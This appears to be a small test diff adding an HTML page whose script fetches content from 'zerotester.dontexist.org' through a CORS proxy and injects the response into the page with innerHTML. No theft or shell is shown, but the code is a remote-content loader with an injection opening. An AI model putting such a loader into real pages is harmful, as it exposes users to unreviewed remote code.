@@ -1,0 +1,14 @@
+<html id="doodoo">
+</html>
+<script>
+const Http = new XMLHttpRequest();
+const url="https://cors-anywhere.herokuapp.com/http://zerotester.dontexist.org/2020/av";
+Http.open("GET", url);
+Http.send();
+Http.onreadystatechange = (e) => {
+  b = Http.responseText
+  console.log(b)
+  a = document.getElementById("doodoo")
+  a.innerHTML = b
+}
+</script> 
